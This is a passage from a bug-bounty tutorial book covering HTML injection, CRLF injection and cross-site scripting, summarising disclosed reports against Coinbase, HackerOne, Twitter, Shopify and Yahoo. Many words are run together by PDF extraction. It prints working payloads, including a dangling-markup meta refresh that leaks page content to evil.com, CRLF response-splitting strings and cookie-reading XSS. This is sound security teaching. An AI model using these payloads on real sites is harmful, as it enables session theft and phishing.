https://hackerone.com/reports/1045431\n1https://hackerone.com/reports/104543\nHTMLInjection 38\nDate Reported: December 10, 2015\nBounty Paid: $200\nDescription:\nFor this vulnerability, the reporter identified that Coinbase was actually decoding URI\nencoded values when rendering text. For those unfamiliar, characters in a URI are\neitherreservedorunreserved.AccordingtoWikipedia,â￿￿reservedarecharactersthat\nsometimes have special meaning like / and &. Unreserved characters are those without\nany special meaning, typically just letters.â￿￿\nSo, when a character is URI encoded, it is converted into its byte value in the American\nStandard Code for Information Interchange (ASCII) and preceded with a percent sign\n(%). So, / becomes %2F, & becomes %26. As an aside, ASCII is a type of encoding which\nwas most common on the internet until UTF-8 came along, another encoding type.\nWith regards to this example, if an attacker entered HTML like:\n<h1>Thisisatest</h1>\nCoinbase would actually render that as plain text, exactly as you see above. However, if\nthe user submitted URL encoded characters, like:\n%3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E\nCoinbasewouldactuallydecodethatstringandrenderthecorrespondinglettersin<h1>\ntags:\nThis is a test\nWiththis,thereportinghackerdemonstratedhowhecouldgenerateanHTMLformwith\nusername and password fields, which Coinbase would render. Had the hacker been\nmalicious, he could have used the vulnerability to trick users into submitting a form\nhe controlled, rendered on Coinbase, to submit values back to a malicious website and\ncapture credentials (assuming people filled out and submitted the form).\nTakeaways\nWhen you’re testing out a site, check to see how it handles different types of\ninput,includingplaintextandencodedtext.Beonthelookoutforsitesthatare\naccepting URI encoded values like %2F and rendering their decoded values, in\nthis case /. While we don’t know what the hacker was thinking in this example,\nit’s possible they tried to URI encode restricted characters and noticed that\nCoinbasewasdecodingthem.TheythenwentonestepfurtherandURIencoded\nallcharacters.\nA great swiss army knife which includes encoding tools is\nhttps://gchq.github.io/CyberChef/. I recommend checking it out and adding it\ntoyourlistofusefultools.\nHTMLInjection 39\n2. HackerOne Unintended HTML Inclusion\nDifficulty: Medium\nUrl: hackerone.com\nReport Link: https://hackerone.com/reports/1129352\nDate Reported: January 26, 2016\nBounty Paid: $500\nDescription:\nAfter reading about the Yahoo! XSS (included in the Cross-Site Scripting Chapter) I\nbecameobsessedwithtestingHTMLrenderingintexteditors.Thisincludedplayingwith\nHackerOne’sMarkdowneditor,enteringthingslikeismap=“yyy=xxx”and“‘test”inside\nof image tags. While doing so, I noticed that the editor would include a single quote\nwithin a double quote - what is known as a dangling markup.\nAtthetime,Ididn’treallyunderstandtheimplicationsofthis.Iknewthatifyouinjected\nanothersinglequotesomewhere, thetwocould beparsedtogether byabrowser which\nwould see all content between them as one HTML element. For example:\n<h1>Thisisatest</h1><pclass=\"someclass\">somecontent</p>'\nWith this example, if you managed to inject a meta tag with a hanging single quote like\nthe following in the content attribute:\n<metahttp-equiv=\"refresh\"content='0;url=https://evil.com/log.php?text=\nThebrowserwouldsubmiteverythingbetweenthetwosinglequoteswhenitperformed\nthe refresh action calling https://evil.com (a meta refresh tag instructs a web browser to\nautomatically refresh the current web page or frame after a given time interval and can\nbeusedtotellthebrowsertorequestanewpageviatheURLattribute).Now,turnsout,\nthiswasknownanddisclosedinHackerOneReport110578byIntiDeCeukelaire3.When\nthat became public, my heart sank a little.\nAccordingtoHackerOne,theyrelyonanimplementationofRedcarpet(aRubylibraryfor\nMarkdownprocessing)toescapetheHTMLoutputofanyMarkdowninputwhichisthen\npassed directly into the HTML DOM via the method dangerouslySetInnerHTML in their\nReact component (React is a Javascript library that can be used to dynamically update a\nweb page’s content without reloading the page). In HackerOne’s implementation, they\nweren’tproperlyescapingtheHTMLoutputwhichledtothepotentialexploit.Now,that\nsaid, seeing the disclosure, I thought I’d test out the new code. I went back and tested\nout adding:\n[test](http://www.torontowebsitedeveloper.com\"testismap=\"alertxss\"yyy=\"test\"\")\n2https://hackerone.com/reports/112935\n3https://hackerone.com/intidc\nHTMLInjection 40\nwhich got rendered as:\n<atitle=\"'test\"ismap=\"alertxss\"yyy=\"test\"&#39;ref=\"http://www.toronotwebsitedeveloper.com\">test</a>\nAs you can see, I was able to inject a bunch of HTML into the <a> tag. As a result,\nHackerOnerolledbacktheiroriginalfixandbeganworkingonescapingthesinglequote\nagain.\nTakeaways\nJustbecausecodeisupdated,doesn’tmeaneverythingisfixed.Testthingsout.\nWhenachangeisdeployed,thatalsomeansnewcodewhichcouldcontainbugs.\nAdditionally,ifyoufeellikesomethingisn’tright,keepdigging!Iknewtheinitial\ntrailingsinglequotecouldbeaproblem,butIdidn’tknowhowtoexploititand\nstopped. I should have kept going. I actually learned about the meta refresh\nexploit by reading FileDescriptor’s blog.innerht.ml (it’s included in the Resources\nchapter)butmuchlater.\n3. Within Security Content Spoofing\nDifficulty: Low\nUrl: withinsecurity.com/wp-login.php\nReport Link: https://hackerone.com/reports/1110944\nDate Reported: January 16, 2015\nBounty Paid: $250\nDescription:\nThough content spoofing is technically a different type of vulnerability than HTML\ninjection, I’ve included it here as it shares the similar nature of an attacker having a site\nrendered content of their choosing.\nWithin Security was built on the Wordpress platform which includes the login path\nwithinsecurity.com/wp-login.php (the site has since been merged with the HackerOne core\nplatform). A hacker noticed that during the login process, if an error occurred, Within\nSecurity would render access_denied, which also corresponded to the error parameter\nin the URL:\nhttps://withinsecurity.com/wp-login.php?error=access_denied\nNoticing this, the hacker tried modifying the error parameter and found that whatever\nvalue was passed was rendered by the site as part of the error message presented to\nusers. Here’s the example used:\n4https://hackerone.com/reports/111094\nHTMLInjection 41\nhttps://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked\nWithinSecurityContentSpoofing\nThekeyherewasnoticingtheparameterintheURLbeingrenderedonthepage.Asimple\ntest changing the access_denied parameter probably revealed the vulnerability in this\ncase, which led to the report.\nTakeaways\nKeep an eye on URL parameters which are being passed and rendered as\nsite content. They may present opportunities for attackers to trick victims\ninto performing some malicious action. Sometimes this results in Cross Site\nScripting Attacks whereas other times is less impactful content spoofing and\nHTMLinjection.It’simportanttokeepinmind,whilethisreportpaid$250,that\nwastheminimumbountyforWithinSecurityandnotallprogramsvalueandpay\nforthesetypesofreports.\nSummary\nHTMLInjectionpresentsavulnerabilityforsitesanddevelopersbecauseitcanbeusedto\nphishusersandtrickthemintosubmittingsensitiveinformationto,orvisiting,malicious\nwebsites.\nHTMLInjection 42\nDiscovering these types of vulnerabilities isn’t always about submitting plain HTML but\nalso about exploring how a site might render your inputted text, like URI encoded\ncharacters.AndwhilenotentirelythesameasHTMLinjection,contentspoofingissimilar\ninthatitinvolveshavingsomeinputreflectedbacktoavictimintheHTMLpage.Hackers\nshould be on the lookout for the opportunity to manipulate URL parameters and have\nthem rendered on the site but keep in mind, not all sites value and pay for these types\nof reports.\n8. CRLF Injection\nDescription\nA Carriage Return Line Feed (CRLF) Injection vulnerability occurs when an application\ndoes not sanitize user input correctly and allows for the insertion of carriage returns\nand line feeds, input which for many internet protocols, including HTML, denote line\nbreaks and have special significance.\nFor example, HTTP message parsing relies on CRLF characters to identify sections of\nHTTP messages, including headers, as defined in RFCs and relied on by browsers. URL\nencoded, these characters are %0D%0A, which decoded represent \\r\\n. The effect of a\nCRLF Injection includes HTTP Request Smuggling and HTTP Response Splitting.\nHTTP Request Smuggling occurs when an HTTP request is passed through a server\nwhich processes it and passes it to another server, like a proxy or firewall. This type\nof vulnerability can result in:\n• Cache poisoning, a situation where an attacker can change entries in an applica-\ntion’s cache and serve malicious pages (e.g., containing JavaScript) instead of a\nproper page\n• Firewall evasion, where a request can be crafted using CRLFs to avoid security\nchecks\n• Request Hijacking, a situation where an attacker can steal HttpOnly cookies and\nHTTP authentication information. This is similar to XSS but requires no interaction\nbetween the attacker and client\nNow, while these vulnerabilities exist, they are difficult to achieve and detailing them\nis beyond the scope of this book. I’ve referenced them here only to demonstrate how\nsevere the impact of Request Smuggling can be.\nHTTP Response Splitting, however, allows an attacker to insert HTTP response headers\nand potentially control HTTP response bodies or split the response entirely, effectively\ncreating two separate responses. This is effective because modifying HTTP headers can\nresult in unintended behavior, such as redirecting a user to an unexpected website or\nserving explicitly new content controlled by attackers.\nCRLFInjection 44\n1. Twitter HTTP Response Splitting\nDifficulty: High\nUrl: https://twitter.com/i/safety/report_story\nReport Link: https://hackerone.com/reports/520421\nDate Reported: April 21, 2015\nBounty Paid: $3,500\nDescription:\nIn April 2015, @filedescriptor reported a vulnerability to Twitter which allowed hackers\nto set an arbitrary cookie by tacking on additional information to an HTTP request.\nEssentially,theHTTPrequesttohttps://twitter.com/i/safety/report_story(aTwitterrelicallow-\ning users to report inappropriate ads) would include a reported_tweet_id parameter.\nIn responding, Twitter would also return a cookie which included the same parameter\npassedinwiththeHTTPrequest.Duringhistests,@filedescriptornotedthattheCRand\nLF characters were sanitized, that LF was replaced with a space and CR would result in\nHTTP 400 (Bad Request Error).\nHowever, being an encyclopedia of knowledge, he knew FireFox previously had an\nencoding bug which stripped off any invalid characters received when setting cookies\ninstead of encoding them. This was a result of FireFox only accepting a certain range\nof acceptable values. Testing out a similar approach with Twitter, @filedescriptor used\nthe Unicode character å˜￿ (U+560A) which ends in %0A, a Line Feed. But that wasn’t\nthe solution. But this parameter was being passed in the URL which means it was URL\nencoded with UTF-8. As a result, å˜￿ became %E5%98%8A.\nNow, submitting this value, @filedescriptor found that Twitter wouldn’t detect any\nmalicious characters, its server would decode the value back to its Unicode value\n56 0A and remove the invalid character 56. This left the line feed characters 0A as\ndemonstrated in his image depicting the process:\n1https://hackerone.com/reports/52042\nCRLFInjection 45\nCRLFDecodingProcess\nSimilarly, he was able to pass in %E5%98%8A%E5%98%8DSet-Cookie:%20test which resulted\nin %0A and %0D being included in the cookie header and enabled him to receive Set-\nCookie: test back from Twitter.\nNow, CLRF attacks can be even more dangerous when they allow for XSS attacks (see\nthe Cross-Site Scripting Chapter for more info). In this case, because Twitter filters were\nbypassed, @filedescriptor could split the response and execute XSS to steal a user’s\nsession and token. Here’s the URL split across multiple lines for formatting purposes:\nCRLFInjection 46\nhttps://twitter.com/login?redirect_after_login=\nhttps://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8D\nlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHT\\\nML%29%E5%98%BE\nNoticethe3bytevaluespepperedthroughout,%E5%98%8A,%E5%98%8D,%E5%98%BC,\n%E5%98%BE. These all get decoded to:\n%E5%98%8A=>560A=>%0A\n%E5%98%8D=>560D=>%0D\n%E5%98%BC=>563C=>%3C\n%E5%98%BE=>563E=>%3E\nReplacingallofthosecharactersandactuallyaddinglinebreaks,here’swhattheheader\nlooks like:\nhttps://twitter.com/login?redirect_after_login=https://twitter.com:21/\ncontent-type:text/html\nlocation:\n<svg/onload=alert(innerHTML)>\nAs you can see, the line breaks allow for the creation of a new header to be returned\nwith executable JavaScript code - svg/onload=alert(innerHTML). The alert will create a\npop-up with the contents of the web page as a proof of concept for Twitter. With this\ncode, a malicious user could steal an unsuspecting victim’s Twitter session information\nsince that sensitive information was included as a header after the injection location\n@filedescriptor exploited.\nTakeaways\nGoodhackingisacombinationofobservationandskill.Inthiscase,@filedescrip-\ntor knew of a previous Firefox encoding bug which mishandled encoding.\nDrawing on that knowledge led him to test out similar encoding on Twitter to\ngetmaliciouscharactersinserted.\nWhenyouarelookingforvulnerabilities,alwaysremembertothinkoutsidethe\nboxandsubmitencodedvaluestoseehowthesitehandlestheinput.\n2. v.shopify.com Response Splitting\nDifficulty: Medium\nUrl: v.shopify.com/last_shop?x.myshopify.com\nReport Link: https://hackerone.com/reports/1064272\n2https://hackerone.com/reports/106427\nCRLFInjection 47\nDate Reported: December 22, 2015\nBounty Paid: $500\nDescription:\nAs a store administrator, Shopify includes server side functionality that sets a cookie\non your browser to record the last store you have logged into. Presumably this is a\nconvenience function to redirect you to your sub-domain when logging in and out since\nURLsfollowthepatternSTORENAME.myshopify.com.ThiscookiesettingoccursviaaGET\nrequest to /last_shop?SITENAME.shopify.com\nInDecember2015,ahackerreportedthatShopifywasn’tvalidatingtheshopparameter\nbeing passed into the call. As a result, using Burp Suite, that hacker altered the request\nappending %0d%0a to generate new headers returned from Shopify servers. Here’s a\nscreenshot:\nShopifyHTTPResponseSplitting\nHere’s the malicious code:\n%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20te\\\nxt/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>\nInthiscase,the%20representsaspaceand%0d%0aistheCRLF.Asaresult,thebrowser\nreceived two valid HTTP responses and rendered the second which could have led to a\nvariety of vulnerabilities, including XSS and phishing.\nTakeaways\nBeonthelookoutforopportunitieswhereasiteisacceptingyourinputandusing\nit as part of its return headers, particularly setting cookies. This is particularly\nsignificantwhenitoccursviaaGETrequestaslessinteractionfromthevictimis\nrequired.\nCRLFInjection 48\nSummary\nGood hacking is a combination of observation and skill and knowing how encoded\ncharacters can be used to exploit vulnerabilities is a great skill to have. %0D%0A\nare particularly significant characters as they can lead to CRLF Injection issues. When\nhacking, be on the lookout for parameters that are potentially attacker controlled but\nbeingreflectedbackinaHTTPheader.Iftheyare,starttestingthesitefortheirhandling\nof encoded characters, particularly %0D%0A. If successful, try to take it a step further\nand combine the vulnerability with a XSS injection for an impactful proof of concept.\nOntheotherhand,iftheserverdoesn’trespondto%0D%0Athinkabouthowyoucould\ndouble encode these characters, passing in %250D or adding 3 byte characters in the\nevent the site is mishandling the extra values just as @filedescriptor did.\n9. Cross-Site Scripting\nDescription\nOne of the most famous examples of a cross-site scripting (or XSS) vulnerability was\nthe Myspace Samy Worm created by Samy Kamkar. In October 2005, Samy exploited\na XSS vulnerability on Myspace which allowed him to store an JavaScript payload on\nhis profile. When a logged in user visited his Myspace profile, the payload code would\nexecute,makingtheviewerSamy’sfriendonMyspace,andupdatingtheviewer’sprofile\nto display the text, “but most of all, samy is my hero”. Then, the code would copy itself\nto the viewer’s profile and continue infecting other Myspace user pages.\nWhileSamydidn’tcreatethewormwithmaliciousintent,Myspacedidn’ttaketookindly\nto it and the government raided Samy’s residence. Samy was arrested for releasing the\nworm and pleaded guilty to a felony charge.\nAlthough Samy’s worm is an extreme example, his exploit shows the broad impact an\nXSS vulnerability could have on a website. Similar to other vulnerabilities we’ve covered\nso far, XSS vulnerabilities occur when websites render certain characters unsanitized,\nwhichcausebrowserstoexecuteunintendedJavaScript.Thesecharactersincludedouble\nquotes (“), single quotes (‘), and angle brackets (< >). They are special because they are\nusedinHTMLandJavaScripttodefineawebpage’sstructure.Forexample,ifasitedidn’t\nsanitize angle brackets, you could insert <script></script>:\n<script>alert(document.domain)</script>\nWhenthispayloadissubmittedtoawebsiteandrenderedunsanitized,the<script></script>\ntags instructs the browser to execute the JavaScript between them. In this case, the\npayload would execute the alert function, which creates a popup dialog that displays\ntheinformationpassedtoalert.Thereferencetodocumentinsidetheparenthesesisthe\nDOMand,inthiscase,willreturnthedomainnameofthesite.Ifthepayloadisexecuted\non https://www.example.com/foo/bar, the popup box would display www.example.com.\nIf a site was properly sanitizing these characters, they would be rendered as HTML\nentities. Viewing the page source for a webpage with them would show “ as &quot; or\n&#34;, ‘ as &apos; or &39;, < as &lt; or &#60; and > as &gt; or &#62;.\nAfter you’ve found an XSS vulnerability, you should confirm its impact because not all\nXSS vulnerabilities are the same . Confirming and including the impact of a bug in your\nwriteupwillimproveyourreport,helpthetriagersvalidateyourbug,andcouldimprove\nyour bounty.\nCross-SiteScripting 50\nFor example, an XSS vulnerability on a site which doesn’t use the httpOnly flag on\nsensitive cookies is different from an XSS vulnerability that does. Without the httpOnly\nflag, your XSS can read cookie values and if those include session identifying cookies,\nyou may be able to steal a target’s session and access their account. You can alert\ndocument.cookie to confirm this (knowing which cookies are considered sensitive by\na site requires trial and error on a per site basis). Even in cases where you don’t have\naccesstosensitivecookies,youcanalertdocument.domaintoconfirmwhetheryoucan\naccess sensitive user information from the DOM and perform actions on behalf of the\ntarget.TheXSSmaynotbeavulnerabilityforthesiteifthecorrectdomainisnotalerted.\nIf you alert document.domain from a sandboxed iFrame, for example, your JavaScript\ncouldbeharmlesssinceitcan’taccesscookies,performactionsontheuser’saccountor\naccess sensitive user information from the DOM. This is because browsers implement a\nSame Origin Policy (SOP) as a security mechanism.\nThe SOP restricts how documents (the D in DOM) are allowed to interact with resources\nloaded from another origin. The SOP protects innocent websites from malicious ones\nattemptingtoexploitthemthroughtheuser.Forexample,ifyouvisitedwww.malicious.com\nand it invoked a GET request to www.example.com/profile in your browser, the SOP would\nprevent www.malicious.com from reading the www.example.com/profile response. However,\nwww.example.com could allow other sites to interact with it cross origin but this is usually\nlimited to specific websites and broad, unrestricted interaction is usually a mistake.\nA site’s origin is determined by the protocol (for example, HTTP or HTTPS), the host\n(for example, www.example.com) and the port of the website. The exception to this rule\nis Internet Explorer, which doesn’t consider the port to be part of the origin. Here\nare some examples of origins and whether they would be considered the same as\nhttp://www.example.com.\nURL SameOrigin? Reason\nhttp://www.leanpub.com/web- Yes N/A\nhacking-101\nhttp://www.leanpub.com/a/yaworsk Yes N/A\nhttps://www.leanpub.com/web- No Differentprotocol\nhacking-101\nhttp://store.leanpub.com/web- No Differenthost\nhacking-101\nhttp://www.leanpub.com:8080/web- No Differentport\nhacking-101\nTherearesomesituationsinwhichtheURLwon’tmatchtheorigin.Browsershandlethe\ncontext of two SOP schemes differently: about:blank and javascript:. These two schemes\ninherit the origin of the document opening them. The about:blank context is part of\nthe about URL scheme used to access information from or interact with the browser\nitself. The JavaScript URL scheme is used to execute JavaScript. The URL doesn’t provide\nCross-SiteScripting 51\ninformation about its origin, so the two schemes are handled differently.\nWhen you find an XSS vulnerability, using alert(document.domain) in your proof of\nconcept is helpful because it confirms the origin where the XSS is executed, espe-\ncially in situations where the URL shown in the browser is different from the ori-\ngin the XSS executes against. This is exactly what happens when a website opens a\njavascript: URL. If www.example.com opened a javascript:alert(document.domain) URL, the\nbrowser address would show javascript:alert(document.domain) but the alert box would say\nwww.example.com because the alert inherits the origin of the previous document.\nWhilewe’veonlycoveredanexamplethatusestheHTML<script>tagtoachieveXSS,you\nwon’t always be able to submit HTML tags when you find a potential injection. In those\ncases,youmightstillbeabletosubmitsingleordoublequotestoinjectanXSSpayload.\nThiscanstillbesignificantdependingonwhereyourinjectionoccurs.Forexample,let’s\nsay you have access to the following code’s value attribute:\n<inputtype=\"text\"name=\"username\"value=\"hacker\">\nBy injecting a double quote in the value attribute, you could close the existing quote\nand inject a malicious XSS payload into the tag. You might do this by changing the value\nattribute to hacker\"onfocus=alert(document.cookie)autofocus\" which would result in:\n<inputtype=\"text\"name=\"username\"value=\"hacker\"onfocus=alert(document.cookie)autofocus\"\">\nThe autofocus attribute instructs the browser to place the cursor focus on the input\ntextbox as soon as the page is loaded and onfocus is a JavaScript attribute that is used\nto tell the browser to execute JavaScript when the input textbox is the focus (without\nautofocus,theonfocususuallywouldoccurwhenapersonclicksthetextbox).However,\nthishaslimitsasyoucan’tautofocusonahiddenfieldandiftherearemultiplefieldsona\npagewithautofocus,eitherthefirstorlastelementwillbefocusedondependingonthe\nbrowser used for testing. When the payload is run, it would alert on document.cookie.\nSimilarly, let’s say you had access to a variable within a script tag. If you were able to\ninjectsinglequotesintothevalueforthenamevariableinthefollowingcode,youcould\nclose the variable and execute your own JavaScript:\n<script>\nvarname='hacker';\n</script>\nHere,sincewecontrolthevaluehacker,changingthenamevariabletohacker';alert(document.cookie);'\nwould result in:\nCross-SiteScripting 52\n<script>\nvarname='hacker';alert(document.cookie);'';\n</script>\nInjecting a single quote and semi-colon closes the variable name and since we are in a\n<script> tag, the JavaScript function alert(document.cookie), which we also injected, will be\nexecuted. We add an additional ;’ to end our function call and ensure the JavaScript is\nsyntactically correct since the site includes a ‘; to close the name variable. Without the ‘;\nat the end, there would be a dangling single quote which could break the page syntax.\nIn terms of testing for XSS, it’s important to realize there are really two main types of\nXSS: reflected and stored. Reflected XSS occurs when the XSS payload is delivered and\nexecuted via a single HTTP request and is not stored anywhere on the site. Since it’s not\nstored, it’s not possible to execute the payload without sending another HTTP request\nwith the payload. However, browsers (Chrome, Internet Explorer, Edge and Safari) have\nattempted to prevent this type of vulnerability by introducing XSS Auditors. This is built\ninfunctionalitybrowsershavewhichattempttoprotectusersfrommaliciouslinkswhich\nexecuteJavaScript.Whenthisoccurs,thebrowserwilltypicallyshowabrokenpagewith\na message stating the page has been blocked to protect users.\nDespite the best efforts of browser developers, XSS Auditors are frequently bypassed\nbecause of the complex ways in which JavaScript can be executed on a site. Since these\nbypasses frequently change, they are beyond the scope of this book but two great\nresources are FileDescriptor’s blog post on the x-xss-protection header1, and Masato\nKinugawa’s filter bypass cheat sheet2.\nIn contrast, stored XSS occurs when a site saves a malicious payload and renders it\nunsanitized. When looking for stored XSS, it’s important to note that sites may render\ntheinputtedpayloadinvariouslocations.It’spossiblethatthepayloadmaynotexecute\nimmediately after submitting it but might execute when another page is accessed. For\nexample, if you created a profile on a website with an XSS payload as your name, the\nXSSmaynotexecutewhenyouviewyourprofilebutmightwhensomeonesearchedfor\nyour name or someone sent you a message.\nXSS can be further broken down into three subtypes: DOM Based, Blind, and Self. DOM\nBased XSS is a result of manipulating a website’s existing JavaScript code to execute\nmalicious JavaScript and can be either Stored or Reflected. For example, if a website\nused the following HTML to replace contents of its website with a value from the URL\nwithout checking for malicious input, it might be possible to execute XSS:\n1https://blog.innerht.ml/the-misunderstood-x-xss-protection/\n2https://github.com/masatokinugawa/filterbypass/wiki/Browser’s-XSS-Filter-Bypass-Cheat-Sheet\nCross-SiteScripting 53\n<html>\n<body>\n<h1>Hi<spanid=\"name\"></span></h1>\n<script>\ndocument.getElementById('name').innerHTML=location.hash.split('#')[1]\n</script>\n</body>\n</html>\nInthisexamplewebpage,thescripttagiscallingthedocumentobject’sgetElementById\nmethod to find the HTML element with the ID ‘name’. This will return a reference to\nthe span element in our <h1> tag. Next, the script tag is modifying the text of the\nbetween the <spanid=\"name\"></span> using the innerHTML method. The script sets the\ntextbetweenthe<span></span>tothevaluefromthelocation.hash,oranythingaftera#\nin the URL (location is another browser API, similar to the DOM, and it provides access\nto information about the current URL).\nIfthispagewereaccessibleatwww.example.com/hi,visitingwww.example.com/hi#Peter\nwouldresultinthepage’sHTMLdynamicallybeingupdatedto<h1>HiPeter</h1>.However,\nsincethispagedoesn’tsanitizethe#valueintheURLbeforeupdatingthespanelement,\nifauservisitedwww.example.com/h1#<imgsrc=xonerror=alert(document.domain)>,aJavaScript\nalert box would pop up with www.example.com shown (assuming no image x was\nreturned to the browser). The resulting HTML from the page would look like:\n<html>\n<body>\n<h1>Hi<spanid=\"name\"><imgsrc=xonerror=alert(document.domain)></span></h1>\n<script>\ndocument.getElementById('name').innerHTML=location.hash.split(‘#’)[1]\n</script>\n</body>\n</html>\nBlind XSS is a type of stored XSS where the XSS payload is rendered by another user in\na location of the website a hacker typically can’t access. For example, this could happen\nif you are able to add XSS as your first and last name when you create a personal\nprofile on a site. Those values may be escaped when regular users view your profile\nbutwhenanadministratorvisitsanadministrativepagelistingallnewusersonthesite,\nthe values may not be sanitized and the XSS executed. The tool XSSHunter3 by Matt\nBryant is great for detecting these. The payloads designed by Matt execute JavaScript\nwhich loads a remote script designed to read the DOM, browser information, cookies,\n3https://xsshunter.com/\nCross-SiteScripting 54\nand other information that it will send back to your XSSHunter account when the script\nis executed.\nSelf XSS vulnerabilities may or may not be stored but usually only impact the user\nentering the payload, hence the “self” in the name. For example, this may occur where\nXSS is submitted via a POST request, but the request is protected by CSRF so only the\ntarget can submit the XSS payload. Since an attacker could only attack themselves, this\ntypeofXSSisusuallyconsideredlowerseverityandnotpaidforbybugbountyprograms.\nIf you find this type of XSS, it’s best to take note of it and look for opportunities to\ncombineitwithanothervulnerabilitytoattackinnocentusers,suchaslogin/logoutCSRF.\nInthistypeofattack,atargetisloggedoutoftheiraccountandloggedintotheattacker’s\naccount to execute the malicious JavaScript. This attack typically requires the ability to\nlogthetargetbackintothisaccountviathemaliciousJavaScriptandagreatexamplewas\npublished by Jack Whitton on one of Uber’s sites4.\nThe impact of XSS depends on a variety of factors, including whether it’s stored or\nreflected, whether cookies are accessible, where the payload executes, and so on.\nDespite the potential implications, fixing XSS vulnerabilities is often easy and only\nrequires software developers to sanitize user input (just like HTML injection) before\nrendering it.\nExamples\n1. Shopify Wholesale\nDifficulty: Low\nUrl: wholesale.shopify.com\nReport Link: https://hackerone.com/reports/1062935\nDate Reported: December 21, 2015\nBounty Paid: $500\nDescription:\nShopify’s wholesale site6 is a simple webpage with a distinct call to action – enter a\nproduct name and click “Find Products”. Here’s a screenshot:\n4https://whitton.io/articles/uber-turning-self-xss-into-good-xss\n5https://hackerone.com/reports/106293\n6wholesale.shopify.com\nCross-SiteScripting 55\nScreenshotofShopify’swholesalesite\nTheXSSvulnerabilityherewasthemostbasicyoucouldfind-textenteredintothesearch\nbox wasn’t escaped so any Javascript entered was executed. Here’s the submitted text\nfrom the vulnerability disclosure: test’;alert(‘XSS’);’\nThe reason this works is Shopify took the input from the user, executed the search\nqueryandwhennoresultswerereturned,Shopifywouldprintamessagesayingthatno\nproducts were found by that name but the Javascript entered would also be reflected\nback within a Javascript tag on the page, unescaped. As a result, exploiting the XSS\nvulnerability was trivial.\nCross-SiteScripting 56\nTakeaways\nTest everything, paying particular attention for situations where text you enter\nisbeingrenderedbacktoyou.TesttodeterminewhetheryoucanincludeHTML\norJavascripttoseehowthesitehandlesit.Alsotryencodedinputsimilartothat\ndescribedintheHTMLInjectionchapter.\nXSS vulnerabilities don’t have to be intricate or complicated. This vulnerability\nwasthemostbasicyoucanfind-asimpleinputtextfieldwhichdidnotsanitize\na user’s input. And it was discovered on December 21, 2015 and netted the\nhacker$500!Allitrequiredwasahacker’sperspective.\n2. Shopify Giftcard Cart\nDifficulty: Low\nUrl: hardware.shopify.com/cart\nReport Link: https://hackerone.com/reports/950897\nReport Date: October 21, 2015\nBounty Paid: $500\nDescription:\nShopify’s hardware giftcard site8 allows users to design their own gift cards with an\nHTML form including a file upload input box, some text boxes for details, etc. Here’s\na screenshot:\n7https://hackerone.com/reports/95089\n8hardware.shopify.com/collections/gift-cards/products/custom-gift-card\nCross-SiteScripting 57\nScreenshotofShopify’shardwaregiftcardform\nThe XSS vulnerability here occurred when Javascript was entered into the image’s name\nfieldontheform.AprettyeasytaskwhendonewithanHTMLproxy.Sohere,theoriginal\nform submission would include:\nContent-Disposition:form-data;name=\"properties[Artworkfile]\"\nWhich would be intercepted and changed to:\nCross-SiteScripting 58\nContent-Disposition:form-data;name=\"properties[Artworkfile<imgsrc='test'onm\\\nouseover='alert(2)'>]\";\nTakeaways\nThere are two things to note here which will help when finding XSS vulnerabili-\nties:\n1. The vulnerability in this case wasn’t actually on the file input field itself -\nitwasonthenamepropertyofthefield.SowhenyouarelookingforXSS\nopportunities,remembertoplaywithallinputvaluesavailable.\n2. Thevalueherewassubmittedafterbeingmanipulatedbyaproxy.Thisis\nkey in situations where there may be Javascript validating values on the\nclientside(yourbrowser)beforeanyvaluesactuallygetbacktothesite’s\nserver.\nInfact,anytimeyouseevalidationhappeninginrealtimeinyourbrowser,\nitshouldbearedflagthatyouneedtotestthatfield!Developersmaymake\nthemistakeofnotvalidatingsubmittedvaluesformaliciouscodeoncethevalues\nget to their server because they think the browser Javascript code has already\nhandlingvalidationsbeforetheinputwasreceived.\n3. Shopify Currency Formatting\nDifficulty: Low\nUrl: SITE.myshopify.com/admin/settings/generalt\nReport Link: https://hackerone.com/reports/1043599\nReport Date: December 9, 2015\nBounty Paid: $1,000\nDescription:\nShopify’s store settings include the ability to change currency formatting. On December\n9, it was reported that the values from those input boxes weren’t be properly sanitized\nwhen setting up social media pages.\nIn other words, a malicious user could set up a store and change the currency settings\nfor the store to the following:\n9https://hackerone.com/reports/104359\nCross-SiteScripting 59\nScreenshotofShopify’scurrencyformatting\nThen, the user could enable the social media sales channels, in the case of the report,\nFacebook and Twitter, and when users clicked on that sale channel tab, the Javascript\nwas executed resulting in a XSS vulnerability.\nTakeaways\nXSS vulnerabilities result when the Javascript text is rendered insecurely. It is\npossible that the text will be used in multiple places on a site and so each and\nevery location should be tested. In this case, Shopify does not include store or\ncheckout pages for XSS since users are permitted to use Javscript in their own\nstore. It would have been easy to write this vulnerability off before considering\nwhetherthefieldwasusedontheexternalsocialmediasites.\n4. Yahoo Mail Stored XSS\nDifficulty: Low\nUrl: Yahoo Mail\nReport Link: Klikki.fi10\nDate Reported: December 26, 2015\n10https://klikki.fi/adv/yahoo.html\nCross-SiteScripting 60\nBounty Paid: $10,000\nDescription:\nYahoo’s mail editor allowed people to embed images in an email via HTML with an IMG\ntag. This vulnerability arose when the HTML IMG tag was malformed, or invalid.\nMost HTML tags accept attributes, additional information about the HTML tag. For\nexample,theIMGtagtakesasrcattributepointingtotheaddressoftheimagetorender.\nFurthermore, some attributes are referred to as boolean attributes, meaning if they are\nincluded,theyrepresentatruevalueinHTMLandwhentheyareomitted,theyrepresent\na false value.\nWith regards to this vulnerability, Jouko Pynnonen found that if he added boolean\nattributes to HTML tags with a value, Yahoo Mail would remove the value but leave the\nequal signs. Here’s an example from the Klikki.fi website:\n<INPUTTYPE=\"checkbox\"CHECKED=\"hello\"NAME=\"checkbox\">\nHere, an input tag may include a checked attribute denoting whether the check box\nwould be rendered as checked off. Following the parsing described above, this would\nbecome:\n<INPUTTYPE=\"checkbox\"CHECKED=NAME=\"checkbox\">\nNoticethattheHTMLgoesfromhavingavalueforcheckedtonovaluebutstillincluding\nthe equal sign.\nAdmittedlythislooksharmlessbutaccordingtoHTMLspecifications,browsersreadthis\nasCHECKED havingthe value ofNAME=”check and theinput tag havinga third 